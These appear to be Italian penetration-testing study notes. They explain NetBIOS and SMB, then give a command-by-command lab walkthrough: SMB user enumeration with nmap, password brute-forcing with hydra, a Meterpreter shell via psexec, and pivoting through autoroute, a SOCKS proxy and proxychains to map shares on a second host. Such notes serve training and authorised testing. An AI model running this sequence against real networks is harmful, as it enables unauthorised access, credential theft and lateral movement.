NetBIOS e SMB sono due tecnologie diverse, ma sono collegate nel contesto del networking e della condivisione di file sulle reti Windows.

### NetBIOS (sistema di input/output di base
della rete)

- NetBIOS è **un'API** e **insieme** di **protocolli di** **rete** per fornire servizi di
comunicazione su una rete locale. Viene utilizzato principalmente per consentire
alle applicazioni su computer diversi di trovarsi e interagire tra loro su una rete.

È un protocollo di rete **vecchio** (anni '80) che fornisce servizi per la comunicazione tra applicazioni su una LAN.

- Funziona a **livello** di **sessione** (Layer 5 OSI).
- **Non è un protocollo di trasporto**
- **Funzioni**: NetBIOS offre tre servizi principali:
    - **Name Service** (NetBIOS-NS): Consente ai computer di registrare, disregistrare e
    risolvere i nomi in una rete locale.
    - **Datagram Service** (NetBIOS-DGM): Supporta la comunicazione senza connessione e
    trasmissione.
    - **Session Service**(NetBIOS-SSN): Supporta la comunicazione orientata alla
    connessione per trasferimenti di dati più affidabili.
- **Porte**: NetBIOS utilizza tipicamente le porte **137** (Name Service), **138**
(Datagram Service) e **139** (Session Service) su **UDP e TCP.**

### SMB (Server Message Block)

- SMB è un **protocollo** di **condivisione** di **file** di rete che consente ai computer di una rete di
condividere file, **stampanti** e altre risorse. È il protocollo principale **utilizzato** nelle reti **Windows** per questi scopi.
- **Funzioni**: Consente agli utenti di **accedere** ai **file** **su computer remoti come** **se fossero locali**.
    - **SMB 1.0**: La versione originale, che presentava vulnerabilità di sicurezza. Veniva utilizzata con i
    sistemi operativi più vecchi, come **Windows XP.**
    - **SMB 2.0/2.1:** Introdotto con **Windows Vista/Windows Server 2008**, offre prestazioni e sicurezza migliorate.
    - **SMB 3.0+**: introdotto con **Windows 8/Windows Server 2012**, con l'aggiunta di funzioni quali
    la crittografia, il supporto multicanale e miglioramenti per la virtualizzazione.
- **Porte**: SMB utilizza generalmente la porta 445 per il traffico SMB diretto (bypassando NetBIOS) e la porta 139 quando si opera con NetBIOS.

Non devono essere configurati insieme **per forza**, ma:

- **SMB moderno (v3) funziona senza NetBIOS** (preferibile per sicurezza).
- **NetBIOS è opzionale**: Mantienilo solo per retrocompatibilità.

ENUMERATION

1. con scansione nmap di pacchetti TCP non troviamo la porta 137
2. **nmap -sU -p IP_TARGET** proviamo la porta 137 **UDP** netbios
3. **nmap -sU -p137 -sV --script nbstat.nse  -Pn -n  IP_TARGET** enumera il nome del PC e degli users loggati
4. **nmap -p445 --script smb-protocols IP_TARGET** enumera le versione SMB supportate dal target, se SMBv1 è in uso viene specificata
5. **nmap -p445 --script smb-security-mode IP_TARGET** Restituisce informazioni sul livello di sicurezza SMB utile per capire con quale user possiamo autenticarci
    1. account usato se è guest è l’account utilizzato di default da windows e possiamo provare ad autenticarci come anonymous
    2. livello di autenticazione
6. Se Guest: **smbclient -L //IP_TARGET** 
    1. password premi invio (proviamo anonymous)
7. **nmap -p445 --script smb-enum-users.nse  IP_TARGET** enumera gli users
8. **nano user.txt** inseriamo gli user trovati per pass dumb con hydra
9. **hydra -L user-txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP_TARGET smb**

ORA CREIAMO UNA SESSIONE METERPRET

-manuale

1. [psexec.py](http://psexec.py) USERNAME@IP_TARGET

-Automatico

1. **use exploit/windows/smb/psexec**
- **set RHOSTS IP_TARGET**
- **set SMBUser USERNAME**
- **set SMBPass PASSWORD**
- exploit

PIVOTING

Dalla sessione Meterpreter ottenuta

1. **shell**
2. **ping IP_TARGET** pinghiamo un IP appartenente alla stessa rete dell’ IP che abbiamo hackerato
3. **ipconfig /all** dobbiamo trovare le configurazioni della rete affinchè autoriute funzioni
4. https://jodies.de/ipcalc?host=10.2.19.152&mask1=255.255.240.0&mask2= copiare IP e SUBNET in quest sito per ottenere il valore /?
5. **CRTL+c**
6. **run autoroute -s IP_TARGET/SUBNET** avviamo il framework autoroute di **meterpreter** che permette di accedere alla gli host della rete target automaticamente
    1. ES: **run autoroute -s 10.10.10.0/24**
    2. **funziona solo per moduli Metasploit** ma **non** per strumenti esterni come **Nmap**. Per questi, è necessario configurare un proxy SOCKS (es. con auxiliary/server/socks_proxy)
7. **cat /etc/proxychains4.conf** per vedere su che **porta** configurare il socks e quale **versione** è (4 o 5)
8. **background** mettere in backgroud la sessione corrente
9. **use auxiliary/server/socks_proxy** 
    1. **set SRVPORT 9050**
    2. **set VERSION 4a**
    3. **exploit**
    4. **jobs** check se il modulo funziona correttamente
10. **proxychains nmap IP_TARGET2 -sT -Pn -sV -p 445** lanciamo il comando al target 2 per trovare porte aperte con proxychains per far risultare come mandante il target 1
    1. **-sT** TCP scan per evitare crash di sistemi
11. **sessions** trovate le porte aperte torniamo su meta e cambiamo sessione meterpreter messa in background
12. **shell**
13. **net view** **IP_TARGET2** mostra lista dei computers in rete
    1. se  non abbiamo privilegi procedere con privilege escalation
14. **CTRL + C**
15. **migrate -N explorer.exe**
16. **shell**
17. **net view** **IP_TARGET2**
18. **net use D: \\IP_TARGET2\DIRECTORY**mappiamo le directory sul TARGET1 per poi accedervi
19. **dir D:** mostra contenuto directory D
